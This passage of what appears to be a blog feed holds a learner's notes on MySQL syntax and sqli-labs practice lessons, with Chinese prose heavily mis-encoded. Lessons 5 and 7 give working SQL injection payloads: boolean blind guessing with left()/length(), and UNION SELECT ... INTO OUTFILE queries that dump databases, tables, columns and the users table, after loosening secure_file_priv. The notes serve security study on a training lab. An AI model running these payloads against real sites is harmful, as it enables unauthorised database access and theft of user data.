å…¶ä¸­classä¸ºæ•°æ®åº“åã€‚</p><p>2.ä½¿ç”¨æ•°æ®åº“ï¼šuse classï¼›</p><p>3.åˆ›å»ºè¡¨ï¼šcreate table aï¼ˆåˆ—å æ•°æ®ç±»å‹ï¼‰ï¼›å…¶ä¸­aä¸ºè¡¨åã€‚ å¦‚ï¼š{   create table class(name varchar(20));    }</p><p>4.æŸ¥çœ‹è¡¨æ•°æ®ï¼ˆå€¼ï¼‰ï¼šselect *form aï¼›</p><p>5.æŸ¥çœ‹è¡¨ç»“æ„ï¼šdesc aï¼›</p><h4 id="ä¸‰-ç‰¹æ®Šçš„"><a href="#ä¸‰-ç‰¹æ®Šçš„" class="headerlink" title="ä¸‰.ç‰¹æ®Šçš„"></a>ä¸‰.ç‰¹æ®Šçš„</h4><p>å¢åŠ åˆ—ï¼šalter table è¡¨å add åˆ—å åˆ—å€¼ç±»å‹ çº¦æŸï¼›</p><p>å°†æ—§è¡¨çš„å†…å®¹å¤åˆ¶åˆ°æ–°è¡¨ï¼šinsert into less42 select *from users</p><p>é™„ï¼šMySQLå¢åˆ æ”¹æŸ¥è¯­å¥å­¦ä¹ èµ„æ–™<a href="https://www.iteye.com/blog/sakyone-365147">https://www.iteye.com/blog/sakyone-365147</a></p><h5 id="å››-æ•°æ®åº“alterçš„ç”¨æ³•ï¼š"><a href="#å››-æ•°æ®åº“alterçš„ç”¨æ³•ï¼š" class="headerlink" title="å››.æ•°æ®åº“alterçš„ç”¨æ³•ï¼š"></a>å››.æ•°æ®åº“alterçš„ç”¨æ³•ï¼š</h5><p>1ï¼šåˆ é™¤åˆ—</p><p>ALTER TABLE ã€è¡¨åã€‘ DROP ã€åˆ—åã€‘</p><p>2ï¼šå¢åŠ åˆ—</p><p>ALTER TABLE ã€è¡¨åã€‘ ADD ã€åˆ—åã€‘ ã€ç±»å‹ã€‘<br>alter table table1 add transactor varchar(10) not Null;</p><p>3ï¼šé‡å‘½ååˆ—</p><p>ALTER TABLE ã€è¡¨åã€‘ CHANGE ã€åˆ—åã€‘ã€æ–°åã€‘ </p><p>4ï¼šä¿®æ”¹è¡¨å­—æ®µ</p><p>alter table è¡¨åç§° change å­—æ®µåç§° å­—æ®µæ–°åç§° å­—æ®µæ–°ç±»å‹ [æ˜¯å¦å…è®¸éç©º];<br>alter table è¡¨åç§° modify å­—æ®µåç§° å­—æ®µæ–°ç±»å‹ [æ˜¯å¦å…è®¸éç©º];</p><p>5ï¼šæŸ¥è¯¢è¡¨çš„å­—æ®µä¿¡æ¯</p><p>desc è¡¨åç§°;</p><p>6ï¼šåˆ›å»ºç´¢å¼•</p><p>ALTER TABLE tbl_name ADD INDEX index_name (column list);</p><p>7ï¼šåˆ é™¤ç´¢å¼•</p><p>ALTER TABLE tbl_name DROP INDEX index_name (column list);</p><p>8ï¼šä¿®æ”¹è¡¨å</p><p>ALTER TABLE è¡¨å rename æ–°è¡¨å;</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/sinat_36053757/article/details/83380684">https://blog.csdn.net/sinat_36053757/article/details/83380684</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h4 id=&quot;ä¸€-MySQLçš„å¢åˆ æ”¹æŸ¥è¯­å¥ã€‚&quot;&gt;&lt;a href=&quot;#ä¸€-MySQLçš„å¢åˆ æ”¹æŸ¥è¯­å¥ã€‚&quot; class=&quot;headerlink&quot; title=&quot;ä¸€.MySQLçš„å¢</summary>
      
    
    
    
    
    <category term="æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
    
  </entry>
  
  <entry>
    <title>lesson7</title>
    <link href="http://example.com/2020/11/29/blog%20g/"/>
    <id>http://example.com/2020/11/29/blog%20g/</id>
    <published>2020-11-29T08:49:29.000Z</published>
    <updated>2021-01-30T14:47:10.344Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ä¸€-é¢„å¤‡"><a href="#ä¸€-é¢„å¤‡" class="headerlink" title="ä¸€.é¢„å¤‡"></a>ä¸€.é¢„å¤‡</h4><p>1.åˆ©ç”¨load_flie()å‡½æ•°å¯¼å‡ºæ–‡ä»¶ï¼š</p><p>load_file(file_name):è¯»å–æ–‡ä»¶å¹¶è¿”å›è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ </p><p>æ³¨.ä½¿ç”¨æ¡ä»¶ï¼š</p><p>a.å¿…é¡»æœ‰æƒé™è¯»å–å¹¶ä¸”æ–‡ä»¶å¿…é¡»å®Œå…¨å¯è¯»ã€‚å½“æ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…æ²¡æœ‰æƒé™è®¿é—®æ—¶å‡½æ•°çš„è¿”å›å€¼ä¸ºç©ºã€‚</p><p>b.æ¬²è¯»å–æ–‡ä»¶å¿…é¡»åœ¨æœåŠ¡å™¨ä¸Šã€‚</p><p>c.å¿…é¡»æŒ‡å®šæ–‡ä»¶å®Œæ•´çš„è·¯å¾„ã€‚</p><p>d.æ¬²è¯»å–æ–‡ä»¶å¿…é¡»å°äº max_allowed_packetã€‚</p><h4 id="äºŒ-lesson7å®æˆ˜"><a href="#äºŒ-lesson7å®æˆ˜" class="headerlink" title="äºŒ.lesson7å®æˆ˜"></a>äºŒ.lesson7å®æˆ˜</h4><h5 id="A-æŸ¥æ‰¾æ³¨å…¥ç‚¹ï¼š"><a href="#A-æŸ¥æ‰¾æ³¨å…¥ç‚¹ï¼š" class="headerlink" title="A.æŸ¥æ‰¾æ³¨å…¥ç‚¹ï¼š"></a>A.æŸ¥æ‰¾æ³¨å…¥ç‚¹ï¼š</h5><p>æŸ¥è¯¢æºä»£ç â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * from users where id&#x3D;((&#39;$id&#39;)) limit 0,1&quot;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ³¨å…¥ç±»å‹ä¸ºï¼šâ€™))</p><p>æ„é€ è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;)) or 1&#x3D;1--+;</span><br></pre></td></tr></table></figure><p>è¿”å›æ­£å¸¸ã€‚</p><h5 id="B1-æ•°æ®åº“ä¸­å¯¼å‡ºæ–‡ä»¶"><a href="#B1-æ•°æ®åº“ä¸­å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="B1.æ•°æ®åº“ä¸­å¯¼å‡ºæ–‡ä»¶"></a>B1.æ•°æ®åº“ä¸­å¯¼å‡ºæ–‡ä»¶</h5><p>é‡åˆ°é—®é¢˜ï¼šè¾“å…¥è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>åœ¨æŒ‡å®šç›®å½•ä¸‹æœªç”Ÿæˆç›¸åº”åä¸ºâ€œ1â€çš„æ–‡ä»¶</p><p>ç”±å‰äººæŒ‡ç‚¹ï¼šmysqlæœ€åˆå¯¹æ–‡ä»¶çš„å¯¼å…¥å’Œå¯¼å‡ºæœ‰é™åˆ¶ï¼Œå› æ­¤åº”å½“å…ˆå–æ¶ˆè¯¥é™åˆ¶</p><p>åœ¨mysqlæ•°æ®åº“ä¸­æ‰§è¡Œè¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ¬åœ°valueçš„å€¼ä¸ºNULLã€‚NULLè¡¨ç¤ºç¦æ­¢ã€‚å³ç¦æ­¢å°†äº§ç”Ÿçš„æ–‡ä»¶å¯¼å…¥mysqlç›®å½•ä¸‹ï¼ˆæ³¨ï¼šå¦‚æœè¿™é‡Œvalueå€¼æœ‰æ–‡ä»¶å¤¹ç›®å½•ï¼Œåˆ™è¡¨ç¤ºåªå…è®¸è¯¥ç›®å½•ä¸‹æ–‡ä»¶ã€‚å¦‚æœä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºä¸é™åˆ¶ç›®å½•ã€‚ï¼‰</p><p>æ—¢ç„¶é—®é¢˜æ‰¾åˆ°äº†ï¼Œé‚£å°±è§£å†³å®ƒâ€”â€”å»æ‰å¯¼å…¥ç›®å½•çš„é™åˆ¶ï¼šåœ¨mysqlé…ç½®æ–‡ä»¶my.iniä¸­åŠ å…¥è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv &#x3D;</span><br></pre></td></tr></table></figure><p>ç„¶åé‡å¯mysqlï¼Œåœ¨æ‰§è¡Œä¸Šè¿°è¯­å¥åˆ™åœ¨æŒ‡å®šç›®å½•ä¸‹æ‰¾åˆ°æŒ‡å®šæ–‡ä»¶ã€‚</p><p>ç”±äºæˆ‘ä»¬åˆšåˆšæ²¡æœ‰è§„å®šäº§ç”Ÿçš„æ–‡ä»¶å¯¼å‡ºåˆ°å“ªé‡Œï¼Œå› æ­¤åœ¨å¯¼å‡ºæ–‡ä»¶æ—¶è¦è¡¨æ˜ç›®å½•åœ°å€ã€‚</p><p>åœ¨mysqlæ•°æ®åº“ä¸­è¾“å…¥è¯­å¥â€”â€”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;;</span><br></pre></td></tr></table></figure><p>åˆ™å¯åœ¨æŒ‡å®šç›®å½•ä¸‹æ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°usersçš„å…¨éƒ¨å†…å®¹ã€‚ï¼ˆæ³¨æ–‡ä»¶ä¸€å®šè¦æ˜¯å¯¼å‡ºç›®å½•ä¸‹ä¸å­˜åœ¨çš„æ–°åå­—æ–‡ä»¶ï¼‰</p><h5 id="B2-åœ¨B1çš„æ“ä½œä¹‹åå°±å¯ä»¥å¼€å§‹å¸¸è§„æµç¨‹ï¼š"><a href="#B2-åœ¨B1çš„æ“ä½œä¹‹åå°±å¯ä»¥å¼€å§‹å¸¸è§„æµç¨‹ï¼š" class="headerlink" title="B2.åœ¨B1çš„æ“ä½œä¹‹åå°±å¯ä»¥å¼€å§‹å¸¸è§„æµç¨‹ï¼š"></a>B2.åœ¨B1çš„æ“ä½œä¹‹åå°±å¯ä»¥å¼€å§‹å¸¸è§„æµç¨‹ï¼š</h5><p>1.çˆ†åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>ç‚¹å¼€1.txtçš„æ–‡ä»¶å¯ä»¥å‘ç°é‡Œé¢åŒ…å«æ•°æ®åº“å</p><p>2.çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure><p>ç‚¹å¼€2.txtçš„æ–‡ä»¶å¯ä»¥å‘ç°é‡Œé¢åŒ…å«åº“åä¸ºsecurityä¸‹çš„æ‰€æœ‰è¡¨çš„è¡¨å</p><p>3.çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\3.txt&quot;--+</span><br></pre></td></tr></table></figure><p>ç‚¹å¼€3.txtçš„æ–‡ä»¶å¯ä»¥å‘ç°é‡Œé¢åŒ…å«åº“åä¸ºsecurityä¸‹è¡¨åä¸ºusesrçš„åˆ—çš„æ‰€æœ‰åˆ—å</p><p>4.çˆ†å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\4.txt&quot;--+</span><br></pre></td></tr></table></figure><p>ç‚¹å¼€4.txtçš„æ–‡ä»¶å¯ä»¥å‘ç°é‡Œé¢åŒ…å«åº“åä¸ºsecurityä¸‹è¡¨åä¸ºusesrçš„æ‰€æœ‰æ•°æ®å€¼ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;ä¸€-é¢„å¤‡&quot;&gt;&lt;a href=&quot;#ä¸€-é¢„å¤‡&quot; class=&quot;headerlink&quot; title=&quot;ä¸€.é¢„å¤‡&quot;&gt;&lt;/a&gt;ä¸€.é¢„å¤‡&lt;/h4&gt;&lt;p&gt;1.åˆ©ç”¨load_flie()å‡½æ•°å¯¼å‡ºæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;load_file(file_name):è¯»å–æ–‡ä»¶å¹¶è¿”å›è¯¥æ–‡ä»¶çš„</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>MySQL</title>
    <link href="http://example.com/2020/11/28/blog%20f/"/>
    <id>http://example.com/2020/11/28/blog%20f/</id>
    <published>2020-11-28T14:35:29.000Z</published>
    <updated>2021-02-04T10:22:02.953Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€.åŸºæœ¬çš„ä½¿ç”¨</p><p>1.æŸ¥çœ‹æœ‰å“ªäº›æ•°æ®åº“ï¼šshow databaseï¼›</p><p>2.è°ƒç”¨securityæ•°æ®åº“ï¼šuse securityï¼›</p><p>3.æŸ¥çœ‹è¢«è°ƒç”¨çš„æ•°æ®åº“ä¸­æœ‰å“ªäº›è¡¨åï¼šshow tablesï¼›</p><p>4.æŸ¥çœ‹è¡¨çš„ç»“æ„ï¼Œå¦‚ï¼šdesc  emailï¼›</p><p>5.æŸ¥çœ‹è¡¨çš„å†…å®¹ï¼šselect *form è¡¨åï¼›</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸€.åŸºæœ¬çš„ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;1.æŸ¥çœ‹æœ‰å“ªäº›æ•°æ®åº“ï¼šshow databaseï¼›&lt;/p&gt;
&lt;p&gt;2.è°ƒç”¨securityæ•°æ®åº“ï¼šuse securityï¼›&lt;/p&gt;
&lt;p&gt;3.æŸ¥çœ‹è¢«è°ƒç”¨çš„æ•°æ®åº“ä¸­æœ‰å“ªäº›è¡¨åï¼šshow tablesï¼›&lt;/p&gt;
&lt;p&gt;4.æŸ¥çœ‹è¡¨çš„ç»“æ„ï¼Œå¦‚ï¼šdes</summary>
      
    
    
    
    
    <category term="mysqlæ•°æ®åº“çš„ä½¿ç”¨" scheme="http://example.com/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>lesson5&amp;lesson6</title>
    <link href="http://example.com/2020/11/20/blog%20e/"/>
    <id>http://example.com/2020/11/20/blog%20e/</id>
    <published>2020-11-20T08:15:38.000Z</published>
    <updated>2021-03-10T10:53:34.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lesson5"><a href="#lesson5" class="headerlink" title="lesson5"></a>lesson5</h1><h2 id="A-sqlå¸ƒå°”ç›²æ³¨"><a href="#A-sqlå¸ƒå°”ç›²æ³¨" class="headerlink" title="A.sqlå¸ƒå°”ç›²æ³¨"></a>A.sqlå¸ƒå°”ç›²æ³¨</h2><h4 id="ä¸€-å¯»æ‰¾æ³¨å…¥ç‚¹"><a href="#ä¸€-å¯»æ‰¾æ³¨å…¥ç‚¹" class="headerlink" title="ä¸€.å¯»æ‰¾æ³¨å…¥ç‚¹"></a>ä¸€.å¯»æ‰¾æ³¨å…¥ç‚¹</h4><p>è¾“å…¥?id=1è¿”å›æ­£å¸¸ï¼›è¾“å…¥?id=1â€™è¿”å›æŠ¥é”™ï¼›ç¡®è®¤æ³¨å…¥ç‚¹ï¼šè¾“å…¥?id=0â€™ or 1=1â€“+ï¼Œè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ­¤é¢˜â€˜ä¸ºæ³¨å…¥ç‚¹ã€‚</p><h4 id="äºŒ-çˆ†åº“ï¼ˆé‡åˆ°æŒ«æŠ˜ï¼‰"><a href="#äºŒ-çˆ†åº“ï¼ˆé‡åˆ°æŒ«æŠ˜ï¼‰" class="headerlink" title="äºŒ.çˆ†åº“ï¼ˆé‡åˆ°æŒ«æŠ˜ï¼‰"></a>äºŒ.çˆ†åº“ï¼ˆé‡åˆ°æŒ«æŠ˜ï¼‰</h4><p>é€šè¿‡è¾“å…¥ä¹‹å‰å­¦è¿‡çš„çˆ†åº“è¯­å¥å‘ç°å¾—åˆ°çš„è¿”å›å€¼åªæœ‰you are inï¼Œæ— æ³•æ˜¾ç¤ºå‡ºæ•°æ®åº“åã€‚æ‰€ä»¥è¦å­¦ä¹ ä¸€ç§æ–°çš„æ³¨å…¥æ–¹æ³•ï¼šç›²æ³¨ã€‚</p><h5 id="A-å‡½æ•°"><a href="#A-å‡½æ•°" class="headerlink" title="A.å‡½æ•°"></a>A.å‡½æ•°</h5><h6 id="leftï¼ˆï¼‰å‡½æ•°ï¼šleftï¼ˆaï¼Œbï¼‰å³ä»å·¦ä¾§æˆªå–å­—ç¬¦ä¸²açš„å‰bä½ï¼Œä¾‹å¦‚leftï¼ˆdatabaseï¼ˆï¼‰ï¼Œ1ï¼‰ï¼Œdatabaseï¼ˆï¼‰æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼ˆä¸ºå­—ç¬¦ä¸²ï¼‰ï¼Œå³è¯‘ä¸ºæˆªå–æ•°æ®åº“åç§°çš„ç¬¬ä¸€ä½æ•°ã€‚"><a href="#leftï¼ˆï¼‰å‡½æ•°ï¼šleftï¼ˆaï¼Œbï¼‰å³ä»å·¦ä¾§æˆªå–å­—ç¬¦ä¸²açš„å‰bä½ï¼Œä¾‹å¦‚leftï¼ˆdatabaseï¼ˆï¼‰ï¼Œ1ï¼‰ï¼Œdatabaseï¼ˆï¼‰æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼ˆä¸ºå­—ç¬¦ä¸²ï¼‰ï¼Œå³è¯‘ä¸ºæˆªå–æ•°æ®åº“åç§°çš„ç¬¬ä¸€ä½æ•°ã€‚" class="headerlink" title="leftï¼ˆï¼‰å‡½æ•°ï¼šleftï¼ˆaï¼Œbï¼‰å³ä»å·¦ä¾§æˆªå–å­—ç¬¦ä¸²açš„å‰bä½ï¼Œä¾‹å¦‚leftï¼ˆdatabaseï¼ˆï¼‰ï¼Œ1ï¼‰ï¼Œdatabaseï¼ˆï¼‰æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼ˆä¸ºå­—ç¬¦ä¸²ï¼‰ï¼Œå³è¯‘ä¸ºæˆªå–æ•°æ®åº“åç§°çš„ç¬¬ä¸€ä½æ•°ã€‚"></a>leftï¼ˆï¼‰å‡½æ•°ï¼šleftï¼ˆaï¼Œbï¼‰å³ä»å·¦ä¾§æˆªå–å­—ç¬¦ä¸²açš„å‰bä½ï¼Œä¾‹å¦‚leftï¼ˆdatabaseï¼ˆï¼‰ï¼Œ1ï¼‰ï¼Œdatabaseï¼ˆï¼‰æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼ˆä¸ºå­—ç¬¦ä¸²ï¼‰ï¼Œå³è¯‘ä¸ºæˆªå–æ•°æ®åº“åç§°çš„ç¬¬ä¸€ä½æ•°ã€‚</h6><h6 id="substrï¼ˆï¼‰å‡½æ•°ï¼šsubstr-a-b-c-ä»-b-ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²-a-çš„-c-é•¿åº¦ï¼Œå–åˆ°çš„å€¼åŒ…æ‹¬bä½ç½®å¯¹åº”å­—ç¬¦æœ¬èº«ã€‚åŒmidï¼ˆï¼‰å‡½æ•°ã€‚"><a href="#substrï¼ˆï¼‰å‡½æ•°ï¼šsubstr-a-b-c-ä»-b-ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²-a-çš„-c-é•¿åº¦ï¼Œå–åˆ°çš„å€¼åŒ…æ‹¬bä½ç½®å¯¹åº”å­—ç¬¦æœ¬èº«ã€‚åŒmidï¼ˆï¼‰å‡½æ•°ã€‚" class="headerlink" title="substrï¼ˆï¼‰å‡½æ•°ï¼šsubstr(a,b,c)ä» b ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² a çš„ c é•¿åº¦ï¼Œå–åˆ°çš„å€¼åŒ…æ‹¬bä½ç½®å¯¹åº”å­—ç¬¦æœ¬èº«ã€‚åŒmidï¼ˆï¼‰å‡½æ•°ã€‚"></a>substrï¼ˆï¼‰å‡½æ•°ï¼šsubstr(a,b,c)ä» b ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² a çš„ c é•¿åº¦ï¼Œå–åˆ°çš„å€¼åŒ…æ‹¬bä½ç½®å¯¹åº”å­—ç¬¦æœ¬èº«ã€‚åŒmidï¼ˆï¼‰å‡½æ•°ã€‚</h6><h6 id="ascii-å‡½æ•°ï¼šå°†æŸä¸ªå­—ç¬¦è½¬æ¢-ä¸º-ascii-å€¼-ã€‚åŒordï¼ˆï¼‰å‡½æ•°ã€‚"><a href="#ascii-å‡½æ•°ï¼šå°†æŸä¸ªå­—ç¬¦è½¬æ¢-ä¸º-ascii-å€¼-ã€‚åŒordï¼ˆï¼‰å‡½æ•°ã€‚" class="headerlink" title="ascii()å‡½æ•°ï¼šå°†æŸä¸ªå­—ç¬¦è½¬æ¢ ä¸º ascii å€¼ ã€‚åŒordï¼ˆï¼‰å‡½æ•°ã€‚"></a>ascii()å‡½æ•°ï¼šå°†æŸä¸ªå­—ç¬¦è½¬æ¢ ä¸º ascii å€¼ ã€‚åŒordï¼ˆï¼‰å‡½æ•°ã€‚</h6><h6 id="lengthï¼ˆï¼‰å‡½æ•°ï¼šè·å–æ•°æ®åº“é•¿åº¦ã€‚å¦‚-id-1â€™and-length-database-nâ€“-å½“nçš„å€¼ç­‰äºæ•°æ®åº“åç§°å­—ç¬¦ä¸²é•¿åº¦æ—¶ï¼Œè¿”å›æ­£å¸¸ï¼Œåä¹‹æŠ¥é”™"><a href="#lengthï¼ˆï¼‰å‡½æ•°ï¼šè·å–æ•°æ®åº“é•¿åº¦ã€‚å¦‚-id-1â€™and-length-database-nâ€“-å½“nçš„å€¼ç­‰äºæ•°æ®åº“åç§°å­—ç¬¦ä¸²é•¿åº¦æ—¶ï¼Œè¿”å›æ­£å¸¸ï¼Œåä¹‹æŠ¥é”™" class="headerlink" title="lengthï¼ˆï¼‰å‡½æ•°ï¼šè·å–æ•°æ®åº“é•¿åº¦ã€‚å¦‚?id=1â€™and length(database())=nâ€“+å½“nçš„å€¼ç­‰äºæ•°æ®åº“åç§°å­—ç¬¦ä¸²é•¿åº¦æ—¶ï¼Œè¿”å›æ­£å¸¸ï¼Œåä¹‹æŠ¥é”™"></a>lengthï¼ˆï¼‰å‡½æ•°ï¼šè·å–æ•°æ®åº“é•¿åº¦ã€‚å¦‚?id=1â€™and length(database())=nâ€“+å½“nçš„å€¼ç­‰äºæ•°æ®åº“åç§°å­—ç¬¦ä¸²é•¿åº¦æ—¶ï¼Œè¿”å›æ­£å¸¸ï¼Œåä¹‹æŠ¥é”™</h6><h5 id="B-çŒœæµ‹æ•°æ®åº“åç§°"><a href="#B-çŒœæµ‹æ•°æ®åº“åç§°" class="headerlink" title="B.çŒœæµ‹æ•°æ®åº“åç§°"></a>B.çŒœæµ‹æ•°æ®åº“åç§°</h5><h6 id="çŒœæµ‹æ•°æ®åº“åç§°ç¬¬ä¸€ä½â€“è¾“å…¥è¯­å¥ï¼š-id-1â€˜and-left-database-1-gt-â€™aâ€™â€“-ï¼Œè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°é¦–å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“é¦–å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚"><a href="#çŒœæµ‹æ•°æ®åº“åç§°ç¬¬ä¸€ä½â€“è¾“å…¥è¯­å¥ï¼š-id-1â€˜and-left-database-1-gt-â€™aâ€™â€“-ï¼Œè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°é¦–å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“é¦–å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚" class="headerlink" title="çŒœæµ‹æ•°æ®åº“åç§°ç¬¬ä¸€ä½â€“è¾“å…¥è¯­å¥ï¼š?id=1â€˜and left(database(),1)&gt;â€™aâ€™â€“+  ï¼Œè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°é¦–å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“é¦–å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚"></a>çŒœæµ‹æ•°æ®åº“åç§°ç¬¬ä¸€ä½â€“è¾“å…¥è¯­å¥ï¼š?id=1â€˜and left(database(),1)&gt;â€™aâ€™â€“+  ï¼Œè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°é¦–å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“é¦–å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚</h6><h6 id="çŒœæµ‹æ•°æ®åº“åç§°ç¬¬äºŒä½â€“è¾“å…¥è¯­å¥-id-1â€™and-left-database-2-gt-â€™saâ€™â€“-è‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚"><a href="#çŒœæµ‹æ•°æ®åº“åç§°ç¬¬äºŒä½â€“è¾“å…¥è¯­å¥-id-1â€™and-left-database-2-gt-â€™saâ€™â€“-è‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚" class="headerlink" title="çŒœæµ‹æ•°æ®åº“åç§°ç¬¬äºŒä½â€“è¾“å…¥è¯­å¥?id=1â€™and 